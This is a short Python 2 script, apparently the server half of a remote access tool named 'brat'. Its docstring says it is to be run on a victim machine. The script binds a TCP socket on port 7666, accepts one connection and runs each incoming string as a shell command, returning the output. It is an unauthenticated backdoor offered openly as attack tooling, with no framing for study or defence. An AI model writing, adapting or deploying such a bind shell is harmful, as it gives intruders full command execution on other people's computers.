#!/usr/bin/env python

"""
brat-server.py : Script to be run on victim machine.

Usage:
    $ python brat-server.py
"""

__author__    = "Brian Jopling"
__copyright__ = "Copyright 2017"
__credits__   = ["Brian Jopling"]
__license__   = "GNU GENERAL PUBLIC LICENSE"
__version__   = "1.0.0"
__status__    = "Development"


""" IMPORTS """

import socket
import subprocess


""" GLOBALS """

PORT = 7666


""" FUNCTIONS """

def run_command(command):
    proc = subprocess.Popen(command,
                            shell=True,
                            stderr=subprocess.PIPE,
                            stdout=subprocess.PIPE)
    if proc:
        output = str(proc.stdout.read())
        print output
        return output
    else:
        error = str(proc.stderr.read())
        print error
        return error


def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host = socket.gethostname()
    sock.bind((host, PORT))
    sock.listen(1)
    c, addr = sock.accept()
    print 'Received connection from', addr
    c.send('Thanks for connecting.')
    while True:
        command = c.recv(1024)
        print '$', command
        cmd_results = run_command(command)
        c.send(cmd_results)


""" PROCESS """

if __name__ == "__main__":
    main()
